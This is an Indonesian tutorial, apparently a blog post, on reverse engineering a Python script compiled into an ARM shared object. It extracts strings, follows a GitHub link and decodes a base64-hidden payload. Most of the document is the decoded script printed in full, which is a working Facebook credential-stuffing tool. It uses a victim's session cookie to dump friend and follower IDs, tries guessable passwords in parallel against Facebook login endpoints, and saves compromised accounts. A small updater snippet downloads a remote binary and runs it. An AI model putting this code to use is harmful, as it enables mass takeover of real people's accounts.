
# Seputar Native Python Script


Disclaimer: Tutorial ini hanya untuk tujuan pembelajaran semata. Penulis tidak bertanggungjawab atas penggunaan maupun penyalahgunaan informasi yang terdapat pada tutorial ini.

Tutorial kali ini akan membahas sedikit mengenai script python yang dikompilasi menjadi aplikasi _native_ misalnya menggunakan [py2exe](https://pypi.org/project/py2exe/), [PyInstaller](https://www.pyinstaller.org/) atau yang lainnya. Kebetulan, beberapa saat yang lalu ada pertanyaan mengenai script seperti itu. Jadi target kita adalah sebuah _shared object_ bernama **brute.cpython-39.so**. Berikut ini adalah informasi dari file tersebut:

```zsh
% file brute.cpython-39.so
brute.cpython-39.so: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, with debug_info, not stripped
```

Selanjutnya kita akan mencari _printable_ _string_ pada aplikasi tersebut, ternyata ada sebuah _string_ yang merupakan tautan ke github berikut ini:

```
https://raw.githubusercontent.com/MRX1202/p/main/tt.py
```

Berikut ini adalah potongan dari script tersebut:

```python
# script bruteforce simpel
# python 3.9
# Created By Males-ID
logo="""
\033[97m
.---.
|   |.--.               __.....__
|   ||__|           .-''         '.
|   |.--.     .|   /     .-''"'-.  `.
|   ||  |   .' |_ /     /________\   \
|   ||  | .'     ||                  |
|   ||  |'--.  .-'\    .-------------'
|   ||  |   |  |   \    '-.____...---.
|   ||__|   |  |    `.             .'
'---'       |  '.'    `''-...... -'
            |   /
            `'-'                       """
import requests,sys,os,time,re,bs4,json;from concurrent.futures import ThreadPoolExecutor as Tai;id=[];cookie=[];req=requests.Session();putih="\033[97m";merah="\033[91m";hijau="\033[92m";kuning="\033[93m";oks=[];cps=[];prem=[];garis="\033[97m~"*40;biru="\033[94m";token=[];cr=[];die=[];asil=[];ungu="\033[95m"
def config(url):
    return req.get(url,cookies={"cookie":cookie[0]}).text

#... dan seterusnya
```

Setelah melihat [repositori pada tautan ke github](https://github.com/MRX1202/p) di atas, ternyata di dalamnya terdapat script lain bernama **new.py** yang isinya adalah sebagai berikut:

```python
url="https://github.com/Males-ID/lite/raw/main/lite.cpython-39.so"
import os
os.system("rm -fr lite.cpython-39.so")
r=requests.get(url)
with open("lite.cpython-39.so","wb") as f:
    f.write(r.content)
os.system(f"python {sys.argv[0]}")
```

Coba kita unduh file tersebut lalu periksa tipenya:

```zsh
% aria2c -q "https://github.com/Males-ID/lite/raw/main/lite.cpython-39.so"

% file lite.cpython-39.so
lite.cpython-39.so: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, with debug_info, not stripped
```

Ternyata tipenya sama dengan file `brute.cpython-39.so`. Selanjutnya kita akan memeriksa _string_ yang ada pada _shared object_ tersebut:

```
IyBweXRob24zLjkNCiMgZ2l0aHViLm ... ludGVybmV0XG4iKQ==
b64decode
base64
```

Ternyata terdapat sebuah _string_ yang di-encode menggunakan base64. Jika kita melakukan decode terhadap _string_ tersebut maka akan menghasilkan sebuah script berikut ini:

```python
# python3.9
# github.com/Males-ID
# script versi Lite:)
import os,sys
try:import requests
except ModuleNotFoundError:os.system(f"python -m pip install requests && python {sys.argv[0]}")
import re,json;from datetime import datetime as log;from time import sleep as sleep;from concurrent.futures import ThreadPoolExecutor as Tai;id=[];sil=[];kuning="\033[1;93m";hijau="\033[1;92m";putih="\033[1;97m";merah="\033[1;91m";sil=[];r=requests.Session();biru="\033[1;94m"
logo=f"""
    ╦  ┬┌┬┐┌─┐  ┌─┐┬─┐┌─┐┌─┐┬┌─┌─┐┬─┐
    ║  │ │ ├┤   │  ├┬┘├─┤│  ├┴┐├┤ ├┬┘
    ╩═╝┴ ┴ └─┘  └─┘┴└─┴ ┴└─┘┴ ┴└─┘┴└─"""
def menu(url,token,coki):
    os.system(f"clear && echo '{logo}' | lolcat")
    init=r.get(url.format(f"/me?access_token={token}"),cookies=coki)
    if "1000" not in init.text:print(f"\n{putih}[{merah}×{putih}] Terjadi Masalah Saat Masuk\n");os.remove("config.json");sys.exit()
    else:n=json.loads(init.text)["name"];i=json.loads(init.text)["id"];print(f"\n{putih}join{merah}: {putih}{n}{merah} > {putih}{i}")
    print(f"""
    {putih}[{biru} 1 {putih}] dari folowers
    [{biru} 2 {putih}] dari followers publik
    [ {biru}3{putih} ] dari daftar teman
    [{biru} 4 {putih}] dari daftar teman publik
    [ {biru}5 {putih}] exciting this program
    """)
    pil(url,token,coki)
def tem(url,token,coki):
    init=r.get(url.format(f"/me/friends?access_token={token}"),cookies=coki)
    if "1000" not in init.text:sys.exit(f"\n{putih}[{merah}×{putih}] Tidak Ada Teman Yang Ditemukan\n")
    for x in json.loads(init.text)["data"]:
        m=x["name"];i=x["id"];id.append(f"{i}|{m}")
    open("cache/log.txt","a").write(f"{log.now()} dumps from my friends > {len(id)}\n")
def pub(url,token,coki):
    t=input(f"{putih}input id{merah} :{kuning} ");init=r.get(url.format(f"/{t}/friends?access_token={token}"),cookies=coki)
    if "1000" not in init.text:sys.exit(f"\n{putih}[{merah}×{putih}] Tidak Ada Teman Yang Ditemukan\n")
    for x in json.loads(init.text)["data"]:
        m=x["name"];i=x["id"];id.append(f"{i}|{m}")
    open("cache/log.txt","a").write(f"{log.now()} dumps from publik friends > {t} > {len(id)}\n")
def sm(url,token,coki):
    init=r.get(url.format(f"/me/subscribers?limit=999999&access_token={token}"),cookies=coki)
    if "1000" not in init.text:sys.exit(f"\n{putih}[{merah}×{putih}] Tidak Ada Followers Yang Ditemukan\n")
    for x in json.loads(init.text)["data"]:
        m=x["name"];i=x["id"];id.append(f"{i}|{m}")
    open("cache/log.txt","a").write(f"{log.now()} dumps from my followers > {len(id)}\n")
def sb(url,token,coki):
    t=input(f"{putih}input id{merah} :{kuning} ");init=r.get(url.format(f"/{t}/subscribers?limit=999999&access_token={token}"),cookies=coki)
    if "1000" not in init.text:sys.exit(f"\n{putih}[{merah}×{putih}] Tidak Ada Followers Yang Ditemukan\n")
    for x in json.loads(init.text)["data"]:
        m=x["name"];i=x["id"];id.append(f"{i}|{m}")
    open("cache/log.txt","a").write(f"{log.now()} dumps from publik followers > {t} > {len(id)}\n")
def su():
    p=input(f"Pilih{merah}: {kuning}")
    if p == "":print(f"{putih}[{merah}×{putih}] Jangan Kosong Dong Sayang");su()
    elif p == "1":
        open("cache/log.txt","a").write(f"{log.now()} crack method api > {len(id)}\n")
        print(f"""
    {biru}*{putih} Trap CTRL + Z untuk stop ngecraxs
        """)
        with Tai(max_workers=30) as subm:
            for x in id:
                us=x.split("|")[0];p=x.replace("|"," ").split()[1];px=[p+"12",p+"123",p+"1234",p+"12345","sayang","Kontol","Bangsat","Freefire","Anjing"]
                for pz in px:
                    subm.submit(api,us,pz)
    elif p == "2":
        open("cache/log.txt","a").write(f"{log.now()} crack method mbasic > {len(id)}\n")
        print(f"""
    {biru}*{putih} Trap CTRL + Z untuk stop ngecraxs
        """)
        with Tai(max_workers=30) as subm:
            for x in id:
                us=x.split("|")[0];p=x.replace("|"," ").split()[1];px=[p+"12",p+"123",p+"1234",p+"12345","sayang","Kontol","Bangsat","Freefire","Anjing"]
                for pz in px:
                    subm.submit(mbasic,us,pz)
    elif p == "3":excit()
    else:print(f"{putih}[{merah}×{putih}] pilih yang bener dong sayang");su()
    hasil()
def mbasic(user,pz):
    req=requests.Session();req.headers.update({"user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"});ses=req.post("https://mbasic.facebook.com/login.php",data={"email":user,"pass":pz}).text
    if "save-device" in ses or "mbasic_logout_button" in ses:print(f"{hijau}[{putih}OKS{hijau}]{putih} {user} | {pz}");open("out/oks.txt","a").write(f"[OKS] {user} | {pz}\n");sil.append(user)
    elif "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:print(f"{kuning}[{putih}CPS{kuning}]{putih} {user} | {pz}");open("out/cps.txt","a").write(f"[CPS] {user} | {pz}\n");sil.append(user)
def api(user,pz):
    req=requests.Session();req.headers.update({"Host":"b-api.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});ses=req.get("https://b-api.facebook.com/method/auth.login",params={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pz,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"})
    if "EAAA" in ses.text:print(f"{hijau}[{putih}OKS{hijau}]{putih} {user} | {pz}");open("out/oks.txt","a").write(f"[OKS] {user} | {pz}\n");sil.append(user)
    elif "www.facebook.com" in ses.json()["error_msg"]:print(f"{kuning}[{putih}CPS{kuning}]{putih} {user} | {pz}");open("out/cps.txt","a").write(f"[CPS] {user} | {pz}\n");sil.append(user)
def tod():
    for x in id:
        open("out/dump_cache.txt","a").write(f"{x}\n")
    print(f"""
    {putih}[{biru} 1 {putih}] crack mode api
    [{biru} 2 {putih}] crack mode mbasic
    [ {biru}3 {putih}] exciting this program
    """)
    su()
def hasil():
    if len(sil) < 1:sys.exit(f"\n{putih}[{merah}×{putih}] Tidak Ada Hasil Yang Didapat, Yg Sabar Ya\n")
    else:sys.exit(f"\n{putih}[{hijau}✓{putih}] Hasil Crack Tersimpan Di Folder {biru}out\n")
def excit():
    sys.exit(f"\n{putih}[{merah}×{putih}] Terimakasih Sudah Make Script Ini\n")
def pil(url,token,coki):
    p=input(f"Pilih{merah}: {kuning}")
    if p == "":print(f"{putih}[{merah}×{putih}] Jangan Kosong Dong Sayang");pil(url)
    elif p == "1":sm(url,token,coki)
    elif p == "2":sb(url,token,coki)
    elif p == "3":tem(url,token,coki)
    elif p == "4":pub(url,token,coki)
    elif p == "5":excit()
    else:print(f"{putih}[{merah}×{putih}] pilih yang bener dong sayang");pil(url)
    tod()
def login():
    os.system(f"clear && echo '{logo}' | lolcat")
    print(f"""
    {biru}* {putih}Login Dulu Bro, Pake CooKie Facebook
    """)
    ck=input(f"CooKie Fb{merah}:{kuning} ")
    r.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/?refsrc=https%3A%2F%2Fm.facebook.com%2F&locale2=id_ID&_rdr","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    init=r.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_",cookies={"cookie":ck}).text
    if "EAAA" not in init:print(f"{putih}[{merah}×{putih}] CooKie Salah Mas Bro");sleep(3);login()
    else:
        tk=re.findall(r"EAAA\w+",init)[0];u={"coki":ck,"token":tk};open("config.json","w").write(json.dumps(u));print(f"{putih}[{hijau}✓{putih}] CooKie Benar Mas Bro");sleep(3)
def folow(url,cookies,me):
    a=r.get(url.format(me),cookies={"cookie":cookies})
    if "/a/subscribe.php" in a.text:
        for x in bs4.BeautifulSoup(a.text,"html.parser").find_all("a",href=True):
            if "/a/subscribe.php" in x["href"]:
                r.get(url.format(x["href"]));break
            else:pass
    else:pass
def kimaxz():
    try:os.mkdir("out")
    except OSError:pass
    try:os.mkdir("cache")
    except OSError:pass
    open("cache/log.txt","a").write(f"{log.now()} user run this script\n")
    if not os.path.isfile("config.json"):login()
    try:r.headers.update({"Host":"graph.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});inti=json.loads(open("config.json","r").read());token=inti["token"];coki={"cookie":inti["coki"]};menu("https://graph.facebook.com{}",token,coki)
    except requests.exceptions.ConnectionError:sys.exit(f"\n{putih}[{merah}×{putih}] Tidak Ada Koneksi Internet\n")
```

Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
